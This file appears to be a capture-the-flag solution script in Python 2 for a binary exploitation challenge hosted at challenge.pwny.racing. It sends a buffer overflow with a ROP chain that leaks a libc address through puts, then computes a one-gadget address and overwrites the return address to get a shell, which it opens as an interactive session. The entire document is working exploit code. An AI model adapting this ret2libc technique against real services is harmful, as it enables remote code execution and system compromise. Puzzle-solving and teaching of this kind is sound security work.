#!/usr/bin/env python2
import socket
import struct
import telnetlib
import sys, time
import pwn

HOST, PORT = "challenge.pwny.racing", 11536
#HOST, PORT = "127.0.0.1", 1234

p32 = lambda v: struct.pack("<I", v)
p64 = lambda v: struct.pack("<Q", v)

s = socket.create_connection((HOST,PORT))
def ru(a, debug=False):
	d = ""
	while not d.endswith(a):
		c = s.recv(4096)
		d += c
                if debug: print `d`
		assert(c)
	return d
sn = lambda d: s.sendall(str(d) + "\n")

rop = [
        0x0000000000400783, #pop rdi
        0x602018,
        0x400550, #puts

        0x400698, #main
]
ru('\n\ninput: ')
sn("A"*24 + "".join(map(p64, rop)))
d = ru('\n\ninput: ')
d=struct.unpack("Q", d[:6].ljust(8, "\x00"))[0]

libc = d - 0x809c0
magic = libc + 0x4f2c5
rop = [
        magic,
]
sn("A"*24 + "".join(map(p64, rop)))

t = telnetlib.Telnet()
#t.set_debuglevel(99999)
t.sock = s
t.interact()
